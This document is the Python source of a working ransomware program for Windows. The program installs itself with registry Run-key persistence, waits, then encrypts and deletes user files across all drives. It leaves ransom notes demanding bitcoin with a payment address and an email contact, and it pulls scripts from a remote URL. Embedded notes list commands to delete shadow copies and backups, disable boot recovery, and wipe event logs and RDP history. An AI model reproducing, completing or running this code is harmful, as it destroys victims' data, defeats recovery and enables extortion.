#  Copyright> YEAR:2022 WHO:Sergey Efimov EMAIL:kilitary@gmail.com

import os
import random
import re
import shutil
import string
import sys
import time
import winreg
from os import getenv
from pathlib import Path
from struct import *
import platform
import logging
import pprint
from ctypes import *
import binascii
import psutil
import requests
import wmi
import threading
# import faulthandler
from cryptography.fernet import Fernet
from typing import Tuple
from var_dump import var_dump
import io
import subprocess
from helpers import (deb, uprint, get_computer_uid, get_extensions, is_dev, exception, load_config, save_config, config,
                     set_priority, dir_files)
from crawler_config import Config
import locale
import pyAesCrypt
import atexit

note = """
vssadmin.exe Delete Shadows /All /Quiet

 cmd.exe /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
 systempropertiesprotection.exe
takeown.exe /F %malwarepath%
icacls.exe %malwarepath% /reset
AutoCAD (LISP, VBA, ARX), Revit, Civil 3D, Map 3D, Inventor, Vault and Fusion 360
Autodesk
3dsmax.exe
autocad.exe
acad.exe
maya.exe
revit.exe
.3ds
.3fr
.7z
.accdb
.accdt
.aep
.ai
.apk
.arw
.asp
.asset
.avi
.backup
.bak
.bar
.bay
.bc6
.bc7
.big
.bik
.bin
.bkf
.bkp
.blob
.bpw
.bsa
.c
.cab
.cas
.cdf
.cdr
.cer
.cfr
.con
.cpp
.cr2
.crt
.crw
.cs
.css
.csv
.d3dbsp
.das
.dat
.db
.db0
.dba
.dbf
.dcr
.der
.desc
.dmp
.dng
.doc
.docm
.docx
.dot
.dotm
.dotx
.dwfx
.dwg
.dxf
.dxg
.eml
.epk
.eps
.erf
.esm
.fdb
.flv
.forge
.fos
.fpk
.fsh
.gdb
.gho
.gif
.h
.hkdb
.hkx
.hplg
.htm
.html
.hvpl
.hxs
.chm
.ibank
.icxs
.idx
.iso
.itdb
.itl
.itm
.iwd
.iwi
.java
.jpe
.jpeg
.jpg
.js
.kdb
.kdbx
.kdc
.key
.kf
.layout
.lbf
.ldf
.litemod
.lrf
.ltx
.lvl
.m2
.m3u
.m4a
.map
.max
.mcmeta
.mdb
.mdbackup
.mddata
.mdf
.mef
.menu
.mlx
.mov
.mp3
.mp4
.mpqge
.mrwref
.ncf
.nrw
.nsf
.ntl
.odb
.odc
.odm
.odp
.ods
.odt
.orf
.oth
.p12
.p7b
.p7c
.pak
.pdb
.pdb
.pdd
.pdf
.pef
.pem
.pfx
.php
.pkpass
.pl
.png
.pot
.potm
.potx
.ppam
.pps
.ppsm
.ppsx
.ppt
.pptm
.pptx
.prf
.prproj
.ps
.psd
.psk
.pst
.ptx
.pub
.py
.qba
.qbb
.qbw
.qbx
.qdf
.qic
.sav
.sb
.sdf
.shtm
.shtml
.sid
.sidd
.sidn
.sie
.sis
.sldm
.sldx
.slm
.sln
.snx
.sql
.sr2
.srf
.srw
.stc
.sum
.svg
.sxc
.t12
.t13
.tar
.tax
.tbl
.tib
.txt
.upk
.vcf
.vdf
.vfs0
.vpk
.vpp_pc
.vtf
.w3x
.wallet
.wav
.wdb
.wma
.wmo
.wmv
.wpd
.wps
.x3f
.xf
.xla
.xlam
.xlk
.xll
.xlm
.xls
.xlsb
.xlsm
.xlsx
.xlt
.xltm
.xltx
.xlw
.xml
.z
.zip
.ztmp
excelude:
\.{ED7BA470-8E54-465E-825C-99712043E01C}\
\tor browser\
\opera\
\opera software\
\mozilla\
\mozilla firefox\
\internet explorer\
\google\chrome\
\google\
\boot\
\application data\
\apple computer\safari\
\appdata\
\all users\
:\windows\
:\system volume information\
:\nvidia\
:\intel\

boot.ini
bootfont.bin
bootsect.bak
desktop.ini
iconcache.db
ntdetect.com
ntldr
ntuser.dat
ntuser.dat.log
ntuser.ini
thumbs.db
winupas.exe
your files are now encrypted.txt
windows update assistant.lnk
master.exe
unlock.exe
unlocker.exe

VBOX, VirtualBox, XEN, qemu, bochs,VM@wmic bios


 ext: .123, .jpeg , .rb , .602 , .jpg , .rtf , .doc , .js , .sch , .3dm , .jsp , .sh , .3ds , .key , .sldm , .3g2 , .lay , .sldm , .3gp , .lay6 , .sldx , .7z , .ldf , .slk , .accdb , .m3u , .sln , .aes , .m4u , .snt , .ai , .max , .sql , .ARC , .mdb ,
 .sqlite3 , .asc , .mdf , .sqlitedb , .asf , .mid , .stc , .asm , .mkv , .std , .asp , .mml , .sti , .avi , .mov , .stw , .backup , .mp3 , .suo , .bak , .mp4 , .svg , .bat , .mpeg , .swf , .bmp , .mpg , .sxc , .brd , .msg , .sxd , .bz2 , .myd , .sxi ,
 .c , .myi , .sxm , .cgm , .nef , .sxw , .class , .odb , .tar , .cmd , .odg , .tbk , .cpp , .odp , .tgz , .crt , .ods , .tif , .cs , .odt , .tiff , .csr , .onetoc2 , .txt , .csv , .ost , .uop , .db , .otg , .uot , .dbf , .otp , .vb , .dch , .ots ,
 .vbs , .der” , .ott , .vcd , .dif , .p12 , .vdi , .dip , .PAQ , .vmdk , .djvu , .pas , .vmx , .docb , .pdf , .vob , .docm , .pem , .vsd , .docx , .pfx , .vsdx , .dot , .php , .wav , .dotm , .pl , .wb2 , .dotx , .png , .wk1 , .dwg , .pot , .wks ,
 .edb , .potm , .wma , .eml , .potx , .wmv , .fla , .ppam , .xlc , .flv , .pps , .xlm , .frm , .ppsm , .xls , .gif , .ppsx , .xlsb , .gpg , .ppt , .xlsm , .gz , .pptm , .xlsx , .h , .pptx , .xlt , .hwp , .ps1 , .xltm , .ibd , .psd , .xltx , .iso ,
 .pst , .xlw , .jar , .rar , .zip , .java , .raw.
desktop: HKCU\Control Panel\Desktop\Wallpaper: “<malware working directory>\@WanaDecryptor@.bmp”
Hyundai Korea, NASA USA, Raytheon USA, IntelKowa Japan, Racal USA, Brown&Root G.Britain, ABB Switzerland, ABB USA, Siemens Germany,
Secor USA, Robert Bosch, AT&T Broadband, Union Electric USA, Jacobs Ireland, Agfa Gevaert, Ball Aerospace USA, SKA Brasil, Harley-Davidson,
Caterpillar USA, Toyota Motor, Panduit USA, Alutec Italy, City of Los Angeles, State of California, Federal Aviation Adm. USA, Czech Telecom, SKODA,
Los Angeles Convention Center, Prague Airport, RWE, Syracuse Airport, Penn State University, Virginia Commonwealth University

bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no
wbadmin delete catalog -quiet
wbadmin delete systemstatebackup
wbadmin delete systemstatebackup -keepversions:0
wbadmin delete backup
wmic shadowcopy delete
vssadmin delete shadows /all /quiet
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
attrib "%userprofile%\documents\Default.rdp" -s -h
del "%userprofile%\documents\Default.rdp"
wevtutil.exe clear-log Applicationwevtutil.exe clear-log Security
wevtutil.exe clear-log System
sc config eventlog start=disabled



"""
avs = """
	360doctor.exe
	360se.exe
	axlbridge.exe
	Culture.exe
	Defwatch.exe
	fdhost.exe
	fdlauncher.exe
	GDscan.exe
	httpd.exe
	MsDtSrvr.exe
	QBCFMonitorService.exe
	QBDBMgr.exe
	QBIDPService.exe
	qbupdate.exe
	QBW32.exe
	RAgui.exe
	RTVscan.exe
	sqlbrowser.exe
	sqlmangr.exe
	supervise.exe
	tomcat6.exe
	wdswfsafe.exe
	wxServer.exe
	wxServerView.exe
"""
key = None
buffer_size = 64 * 1024
password = "ghwehhergfd"
autorunned = False
exe_self = None
files_to_encrypt = []
activate_encryption = False
CURSOR_UP_ONE = '\x1b[1A'
ERASE_LINE = '\x1b[2K'
virtualization_detected = False
run_analyze_network = True
intensive_sent = 0
intensive_recv = 0

def detect_encrypt_storage():
    parts = psutil.disk_partitions()
    hdds = {}
    try:
        for part in parts:
            hdd = psutil.disk_usage(part.mountpoint)
            hdds[part.mountpoint] = hdd.free
    except Exception as e:
        deb(f'part in parts: {e}')
    
    deb(f'disks: {hdds}')
    hdds = sorted(hdds, key=hdds.get, reverse=True)
    deb(f'disk selected: {hdds[0]}')
    config['core'] = {'encryption_dir':hdds[0] + r'temp\edata'}
    deb(f'encryption_dir: {config["core"]["encryption_dir"]}')
    return hdds[0]

def str_id_generator(size=6, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

def suitable(path: str):
    """
    check user file is good for seizing
    """
    if any(s for s in Config.SKIP if s in path.lower()) and re.match(f'.*?\\.({get_extensions()})?$', path):
        deb(f'\rexclude {path}')
        return False
    
    if re.match(f'.*?\\.({get_extensions()})?$', path) and config['core']['encryption_dir'].lower() not in path.lower():
        if Config.MAX_FILE_SIZE_MB >= (os.stat(path).st_size / 1024.0 / 1024.0) >= Config.MIN_FILE_SIZE_MB:
            return True
    return False

def crypt_data(data_to_crypt: bytes):
    fernet = Fernet(key)
    file_struct = pack('245s', bytes(str_id_generator(size=245), encoding='utf8')) + bytes('!!!',
                                                                                           encoding='utf8') + data_to_crypt
    out_data = fernet.encrypt(file_struct)
    return out_data

def get_serial_number_of_physical_disk(drive_letter='C:'):
    c = wmi.WMI()
    logical_disk = c.Win32_LogicalDisk(Caption=drive_letter)[0]
    partition = logical_disk.associators()[1]
    physical_disc = partition.associators()[0]
    return physical_disc.SerialNumber

def get_disks():
    parts = psutil.disk_partitions()
    return parts

def tag_system():
    Path(getenv('temp') + '/done.tag').touch()

def is_system_done():
    if os.path.isfile(getenv('temp') + '/done.tag'):
        return True
    return False

def pull_scripts():
    deb("pulling new scripts ...")
    headers = {
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66'}
    r = requests.get(Config.PULL_URL, headers=headers)
    deb(f'{r.text}')

def get_activation_time() -> str:
    return str(int(str(time.time()).split('.')[0]) + 60 * Config.SLEEP_TIME_UNTIL_ENCRYPTION_MINUTES)

def get_usable_exe_pathes() -> Tuple[str, str]:
    '''
    Get list of running process sorted by Memory Usage
    '''
    objects = []
    # Iterate over the list
    for proc in psutil.process_iter():
        try:
            # Fetch process details as dict
            pinfo = proc.as_dict(attrs=['exe', 'pid', 'name', 'username'])
            pinfo['vms'] = proc.memory_info().vms / (1024 * 1024)
            # Append dict to list
            objects.append(pinfo);
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
            deb(f'process: {e}')
    # Sort list of dict by key vms i.e. memory usage
    objects = sorted(objects, key=lambda proc_obj:proc_obj['vms'], reverse=True)
    return objects[0]['name'].strip(), objects[0]['exe'].strip()

def install():
    first_install = False
    next_path = u''
    try:
        deb(f"profiledir: {os.environ['USERPROFILE']}")
        (process_name, proc_dir) = get_usable_exe_pathes()
        config['core']['exename'] = process_name.split('.')[0]
        proc_name = process_name.split('.')[0] + 'Host.exe'
        proc_dir = os.path.dirname(proc_dir)[3:]
        
        next_path = os.path.join(os.environ['USERPROFILE'], proc_dir)
        os.makedirs(next_path, exist_ok=True)
        next_path = os.path.join(next_path, proc_name)
        
        if os.path.isfile(next_path):
            os.unlink(next_path)
        
        config['core']['exe'] = next_path
        config['core']['activation_at'] = get_activation_time()
        deb(f"exe {config['core'].get('exe')}")
        
        if not os.path.exists(next_path):
            first_install = True
        
        deb(f"copy({exe_self}, {next_path}")
        
        shutil.copyfile(exe_self, next_path)
        
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        if not is_dev():
            winreg.SetValueEx(reg_key, process_name.split('.')[0], 0, winreg.REG_SZ,
                              f"{next_path} -a --background --check-update --embedding")
        winreg.CloseKey(reg_key)
    except Exception as e:
        uprint(f"install: {e}->{sys.exc_info()}")
        exception(e)
    
    if first_install and os.path.exists(next_path):
        uprint(f'{get_computer_uid()}: installed')
        sys.exit(3)

def get_pid_by_process_name(a_process_name):
    for proc in psutil.process_iter():
        if proc.name == a_process_name:
            return proc.pid

def print_files():
    # take the second element for sort
    def take_second(elem):
        return elem[1]
    
    while True:
        time.sleep(1)
        parts = psutil.disk_partitions()
        hdds = {}
        for part in parts:
            hdd = psutil.disk_usage(part.mountpoint)
            hdds[part.mountpoint] = hdd.free
        # hdds = sorted(hdds, key=hdds.get, reverse=True)
        free = hdds.values()
        sorted_list = sorted(hdds, key=take_second)
        var_dump(sorted_list)
        logging.debug(f'{free}')

def empty_dest_dir():
    delete_files = dir_files(config['core']['encryption_dir'])
    if len(delete_files) > 0:
        deb(f'deleting {len(delete_files)} files')
        for file in delete_files:
            os.unlink(file)

def post_install():
    global activate_encryption
    
    now = int(str(time.time()).split(".")[0])
    deb(f'now: {now}')
    activation_time = int(config["core"]['activation_at'])
    deb(f'activation time: {activation_time}')
    wait_time = activation_time - now
    deb(f'time until encryption: {wait_time} secs ({wait_time / 60:.0f} mins)')
    
    if wait_time <= 0:
        activate_encryption = True

def _generate_share_dictionary(headerRow):
    """Accepts a variable width, white space delimited string that we attempt
        to divine column delimiters from. Returns a dictionary of field names
        and a tuple with start/stop slice positions"""
    
    # This used to be a more complex problem before I realized I didn't have
    # to do GET * in my source. GET Name, Path greatly simplifies
    # but this code is generic so I keep it as is
    
    header = headerRow
    fields = header.split()
    tempOrds = {}
    ords = {}
    # Populate the temporary ordinals dictionary with field name and the
    # starting, zero based, ordinal for it.
    # i.e. given
    # Name     Path
    # 01234567890123456789
    # we would expect Name:0, Path:9
    for field in fields:
        tempOrds[field] = headerRow.index(field)
    
    # Knowing our starting ordinal positions, we will build a dictionary of tuples
    # that contain starting and ending positions of our fields
    for iter in range(0, len(fields) - 1):
        ords[fields[iter]] = (tempOrds[fields[iter]], tempOrds[fields[iter + 1]])
    
    # handle the last element
    ords[fields[-1]] = (tempOrds[fields[-1]], len(headerRow))
    
    return ords

def parse_network_shares_name_path(header, results):
    """Rip apart the results using our header dictionary"""
    _shares = {}
    # use the above to slice into our results
    # skipping first line since it is header
    for _line in results.splitlines():
        if _line:
            _shares[_line[header["Name"][0]: header["Name"][1]].rstrip()] = _line[
                                                                            header["Path"][0]: header["Path"][1]].rstrip()
    return _shares

def scan_shares():
    """Use WMIC to get the full share list. Needed because "net share" isn't parseable"""
    _command = r"C:\Windows\System32\wbem\WMIC.exe /output:stdout /namespace:\\root\cimv2 path Win32_Share GET Name, Path"
    # _command = r"C:\Windows\System32\wbem\WMIC.exe /output:stdout /namespace:\\root\cimv2 path Win32_Share GET *"
    _results = subprocess.check_output(_command, shell=True).decode('UTF-8')
    
    _headerRow = _results.splitlines()[0]
    headerOrdinals = _generate_share_dictionary(_headerRow)
    
    _shares = parse_network_shares_name_path(headerOrdinals, _results)
    pprint.pp(_shares)
    sys.exit(-5)

def detect_malware_type():
    deb('detecting malware payload according machine specs ... ')
    c = wmi.WMI()
    SYSINFO = c.Win32_ComputerSystem()
    OSINFO = c.Win32_OperatingSystem()[0]
    CPUINFO = c.Win32_Processor()[0]
    HDDINFO = c.Win32_LogicalDisk()[0]
    RAMINFO = c.Win32_PhysicalMemory()[0]
    
    pprint.pp(SYSINFO, depth=13)
    MANUFACTURER = SYSINFO[0].Manufacturer
    MODEL = SYSINFO[0].Model
    RAMTOTAL = int(SYSINFO[0].TotalPhysicalMemory)
    HDDTOTAL = int(HDDINFO.size)
    RAMSIZE = round(RAMTOTAL)
    HDDSIZE = round(HDDTOTAL)
    deb("Model: " + MANUFACTURER + " " + MODEL)
    deb(f"HDD: {HDDTOTAL / 1024.0 / 1024.0 / 1024.0:.2f}GB")
    deb(f"RAM: {RAMTOTAL / 1024.0 / 1024.0 / 1024.0:.2f}GB")
    deb("CPU: " + CPUINFO.name)
    deb("OS: " + OSINFO.caption)
    
    sys.exit(-4)

def write_advert(file):
    file.write(
        f"This computer has been seized by file encryptor.\r\nIf you need your files back here is the decryption process:\r\n")
    file.write(f"\tdecryption payment bitcoin amount is: 0.0029 bitcoins (~100USD) (for all files)\r\n")
    file.write(f"\tpayment bitcoin address: bc1qmw03xvyv0qjrsp2wlk2hp0x8c6lqejrlxtuz3c\r\n")
    file.write(f"\tid of your computer: {get_computer_uid()}\r\n")
    file.write(f"\tafter payment you will need to notify me to on email sgn2002@protonmail.com\r\n")
    file.write(f"\t\tmsg: hello, my id is [computer_id], bitcoin wallet [your_bitcoin_wallet]\r\n")
    file.write(f"\twait for my reply in near 8 hours with your decryption password\r\n")
    file.write(
        f"\tafter you get the password you need to execute {config['core']['encryption_dir']}\\decryptall.exe and paste (shift+ins) received password\r\n")
    file.write(f"\twait for decryption process\r\n")
    file.write(f"\tbye\r\n")
    file.write(
        f"\r\nVisit https://www.bitcoin.com/get-started/how-do-i-send-and-receive-bitcoin/ to get info about bitcoin\r\n")

def advert_info():
    try:
        txt_name = os.path.join(getenv('temp'), 'YOUR_ENCRYPTED_FILES_DATA.txt')
        
        try:
            with open(txt_name, "wt") as file:
                write_advert(file)
        except Exception as e:
            deb(f'{txt_name}: {e} {sys.exc_info()}')
        
        shutil.copy(txt_name, os.path.join(os.environ["USERPROFILE"], "Desktop"))
        os.unlink(txt_name)
    except Exception as e:
        deb(f"advert: {e}")

def get_advert():
    txt_name = os.path.join(getenv('temp'), 'aaaaa.txt')
    text = '<error>'
    try:
        with open(txt_name, "w+t") as file:
            write_advert(file)
            file.seek(0)
            text = file.read()
    except Exception as e:
        deb(f'{txt_name}: {e} {sys.exc_info()}')
    
    try:
        os.unlink(txt_name)
        return str(text)
    except Exception as e:
        deb(f"advert: {e}")

def analyze_network():
    last_recv = 0
    last_sent = 0
    global intensive_sent
    global intensive_recv
    while run_analyze_network:
        net_stats = psutil.net_io_counters()
        
        deb(f'\rnetwork [{net_stats}] bytes_in: {net_stats.bytes_recv - last_recv:8} bytes_out: {net_stats.bytes_sent - last_sent:8}\r')
        
        if net_stats.bytes_sent - last_sent > 1024 * 1024 * 4:
            intensive_sent = True
        elif net_stats.bytes_sent - last_sent < 1024 * 1024 * 1:
            intensive_sent = False
        if net_stats.bytes_recv - last_recv > 1024 * 1024 * 4:
            intensive_recv = True
        elif net_stats.bytes_recv - last_recv < 1024 * 1024 * 1:
            intensive_recv = False
        
        last_recv = net_stats.bytes_recv
        last_sent = net_stats.bytes_sent
        
        time.sleep(1)
    
    deb(f'intensive_sent: {intensive_sent} intensive_recv: {intensive_recv}')

if __name__ == '__main__':
    locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
    logging.basicConfig(
        format="%(asctime)s [%(levelname)s] [%(thread)d] %(filename)s(%(funcName)s:%(lineno)d) - %(message)s",
        level=logging.DEBUG)
    
    uprint(
        f'{get_computer_uid()}: user: {os.getlogin()} ppid: {os.getppid()} dir: {os.getcwd()} platform: {platform.platform()} '
        f'python: {platform.python_version()} win32: {platform.win32_ver()}'
        f' edition: {platform.win32_edition()} file: {__file__}')
    
    load_config()
    atexit.register(save_config)
    
    if is_dev():
        Config.EXTENSIONS_ENCODED = "dDNzdHx0ZXN0"
        deb(f'developer machine {get_extensions()}')
    
    path = create_unicode_buffer(4096)
    windll.kernel32.GetModuleFileNameW(None, path, 4096)
    exe_self = path.value
    
    opts = [opt for opt in sys.argv[1:] if opt.startswith("-")]
    if "-a" in opts:
        autorunned = True
    
    if not config.has_section('core') or not config.has_option('core', 'encryption_dir'):
        detect_encrypt_storage()
    
    if not autorunned:
        # if is_dev():
        # 	scan_shares()
        # 	detect_malware_type()
        install()
        sys.exit(1)
    else:
        post_install()
    
    if not is_dev() and is_system_done() and Config.IS_RELEASE:
        deb("system is seized")
        pull_scripts()
        sys.exit(2)
    
    if not activate_encryption:
        deb(f'sleep exit')
        sys.exit(0)
    
    ant = threading.Thread(target=analyze_network)
    ant.start()
    
    drives = get_disks()
    var_dump(drives)
    set_priority()
    
    key = Fernet.generate_key()
    password = str_id_generator(size=48)
    
    # empty_dest_dir()
    
    deb(f'collecting files (extensions={get_extensions()}, skip={Config.SKIP}) ...')
    
    # t = threading.Thread(target=print_files, args=())
    # t.start()
    
    num_encrypted = 0
    bytes_to_encrypt = 0
    for drive in drives:
        num_files = 0
        
        deb(f"scanning drive {drive.device} ... ")
        
        files = dir_files(drive.device)
        
        for file in files:
            try:
                if suitable(file):
                    deb(f"\radd {file} ({os.stat(file).st_size / 1024.0 / 1024.0:.2f}MB)")
                    files_to_encrypt.append(file)
                    num_files += 1
                    bytes_to_encrypt += os.stat(file).st_size
            except Exception as err:
                deb(f"scan error: {err}")
        
        deb(f"done drive {drive.device} ({num_files} files)")
    
    uprint(
        f"{get_computer_uid()}: starting encryption of {len(files_to_encrypt)} files, {bytes_to_encrypt / 1024.0 / 1024.0:.2f}MB to encrypt, pass: {password}" +
        f" virtualization_detected: {virtualization_detected}")
    deb(f"processing files {files_to_encrypt}")
    
    run_analyze_network = False
    ant.join()
    
    set_priority(increase=True)
    
    if not os.path.isdir(config['core']['encryption_dir']):
        try:
            os.makedirs(config['core']['encryption_dir'], exist_ok=True)
        except Exception as e:
            deb(f'create encrypt dir: {e}')
            sys.exit(-1)
    
    bytes_encrypted = 0
    
    for file in files_to_encrypt:
        done_file = False
        try:
            filename = os.path.basename(file)
            size_mb = os.stat(file).st_size / 1024.0 / 1024.0
            
            deb(f"{file}: {size_mb:.4f}MB, reading ... ", end="")
            
            with open(file, "rb") as f:
                try:
                    crypted_file_name = f"{config['core']['encryption_dir']}\\" + hex(
                        binascii.crc32(bytes(file, encoding='utf8'))) + f"-{filename}-crypted"
                    if os.path.exists(crypted_file_name) and os.stat(crypted_file_name).st_size > 0:
                        deb(f"\r\nskip {crypted_file_name} ({os.stat(crypted_file_name).st_size} bytes) exist: {os.path.exists(crypted_file_name)}")
                        continue
                    file_data = f.read()
                    old_size = len(file_data)
                    deb(f" {old_size} bytes OK ... ", end="")
                    fIn = io.BytesIO(file_data)
                    fCiph = io.BytesIO()
                    deb(f"crypting ... Processing: {num_encrypted / len(files_to_encrypt) * 100.0:.2f}%", end="")
                    pyAesCrypt.encryptStream(fIn, fCiph, password, buffer_size)
                    hdr = pack(Config.HEADER, Config.SIGN, Config.VER, binascii.crc32(file_data),
                               os.stat(file).st_size, bytes(file, encoding='utf8'))
                    try:
                        with open(crypted_file_name, "wb") as w:
                            w.write(hdr)
                            encrypted_data = fCiph.getvalue().replace(b"pyAesCrypt", b"4ertKcrypt")
                            w.write(encrypted_data)
                        num_encrypted += 1
                        done_file = True
                    
                    except Exception as e:
                        deb(f"write encrypted: {e}")
                
                except Exception as e:
                    deb(f"Crypt i/o error: {e}")
            
            if done_file:
                deb(f' encrypted. ', end='')
                bytes_encrypted += os.stat(file).st_size
                os.unlink(file)
                if not os.path.isfile(file):
                    deb(f'deleted')
                    with open(file + ".txt", "wt") as f:
                        f.write(
                            'This file is encrypted by document cryptor. Look instructions to decrypt it in the file "YOUR_ENCRYPTED_FILES_DATA.txt" on your desktop.' +
                            f'\r\nThe encrypted data is located in file {crypted_file_name}.\r\n\r\n' + get_advert())
                else:
                    deb(f'system error: fail to delete {file}')
        
        except Exception as e:
            deb(f"\r\nencryption({file}): {e}-> {sys.exc_info()}")
    
    advert_info()
    tag_system()
    uprint(f"{get_computer_uid()}: done encryption, {num_encrypted}/{len(files_to_encrypt)} files encrypted, "
           f"{bytes_encrypted / 1024.0 / 1024.0:.2f}MB encrypted, {len(drives)} disks processed, pass {password}")
